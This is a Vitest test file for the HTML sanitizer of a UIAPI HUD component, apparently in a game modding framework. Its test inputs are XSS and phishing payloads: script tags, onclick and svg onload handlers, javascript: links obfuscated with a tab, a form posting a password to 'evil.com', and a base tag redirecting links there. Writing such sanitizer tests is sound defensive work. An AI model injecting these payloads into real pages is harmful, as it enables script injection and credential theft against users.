import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { UIAPI } from './UIAPI';

// @vitest-environment jsdom

describe('UIAPI Security', () => {
  let uiApi: UIAPI;

  beforeEach(() => {
    uiApi = new UIAPI('test_mod');
  });

  afterEach(() => {
    uiApi._cleanup();
  });

  it('should remove script tags', () => {
    const id = uiApi.addHUDElement('test1', {
      position: 'top_left',
      html: '<div>Safe</div><script>alert(1)</script>'
    });

    const element = document.getElementById(id);
    expect(element?.innerHTML).not.toContain('<script>');
    expect(element?.textContent).toContain('Safe');
    // Note: InnerHTML might differ depending on browser implementation, but script should be gone.
    // In jsdom, script tags might be removed or remain but empty.
    // The sanitizer explicitly removes them.
    expect(element?.querySelector('script')).toBeNull();
  });

  it('should remove on* attributes', () => {
    const id = uiApi.addHUDElement('test2', {
      position: 'top_left',
      html: '<div onclick="alert(1)">Click me</div>'
    });

    const element = document.getElementById(id);
    const div = element?.querySelector('div');
    expect(div?.hasAttribute('onclick')).toBe(false);
  });

  it('should remove javascript: links', () => {
    const id = uiApi.addHUDElement('test3', {
      position: 'top_left',
      html: '<a href="javascript:alert(1)">Link</a>'
    });

    const element = document.getElementById(id);
    const link = element?.querySelector('a');
    expect(link?.hasAttribute('href')).toBe(false);
  });

  // 🚨 Security gaps we want to fix

  it('should remove form tags (phishing risk)', () => {
    const id = uiApi.addHUDElement('test_form', {
      position: 'top_left',
      html: '<form action="http://evil.com/login"><input type="password"></form>'
    });

    const element = document.getElementById(id);
    expect(element?.querySelector('form')).toBeNull();
  });

  it('should remove svg tags (XSS risk)', () => {
    const id = uiApi.addHUDElement('test_svg', {
      position: 'top_left',
      html: '<svg onload="alert(1)"><circle /></svg>'
    });

    const element = document.getElementById(id);
    expect(element?.querySelector('svg')).toBeNull();
  });

  it('should remove base tags (hijacking relative links)', () => {
    const id = uiApi.addHUDElement('test_base', {
      position: 'top_left',
      html: '<base href="http://evil.com/">'
    });

    const element = document.getElementById(id);
    expect(element?.querySelector('base')).toBeNull();
  });

  it('should remove javascript: links with control characters', () => {
    // \x09 is tab
    const id = uiApi.addHUDElement('test_js_tab', {
      position: 'top_left',
      html: '<a href="java\x09script:alert(1)">Link</a>'
    });

    const element = document.getElementById(id);
    const link = element?.querySelector('a');
    // Either the attribute is removed, or the value is sanitized.
    // Current impl checks startsWith('javascript:'), which fails here.
    // So the attribute would remain. We want it gone.
    // Note: JSDOM might parse this attribute value differently than a real browser,
    // but typically it preserves it.

    // If the sanitizer doesn't catch it, it remains.
    // We expect it to be gone in the fixed version.
    expect(link?.hasAttribute('href')).toBe(false);
  });
});
